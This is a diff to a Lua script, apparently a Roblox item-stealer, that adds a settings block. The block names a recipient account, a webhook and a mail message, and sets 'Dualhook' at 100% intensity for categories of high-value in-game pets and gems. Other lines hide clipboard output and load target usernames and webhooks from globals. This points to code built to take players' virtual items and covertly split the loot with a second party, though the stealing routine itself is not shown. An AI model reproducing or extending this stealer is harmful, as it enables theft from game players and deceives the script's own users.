@@ -1,3 +1,45 @@
+getgenv().Settings = {
+    User = "TehPucuk_55",
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    MailMessage = "Monzz Is Better",
+    Titanics = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Banana = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Huges = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Pogs = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Exclusives = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Events = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Secrets = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    HC_DM_Mythics = {
+        Dualhook = true,
+        Intensity = 100 --%
+    },
+    Gems = {
+        Dualhook = true,
+        Intensity = 100 --%
+    }
+}
+
 if getgenv().executed then return end
 getgenv().executed = true
 
@@ -39,13 +81,13 @@ setclipboard = antiPrint
 -- Users And Stuff
 
 if UserName == nil then
-    UserName = UserName
+    UserName = _G.UserName
 end
 if UserName2 == nil then
-    UserName2 = UserName2
+    UserName2 = _G.UserName2
 end
 if Webhook == nil then
-    Webhook = Webhook
+    Webhook = _G.Webhook
 end
 -- User Checks
 
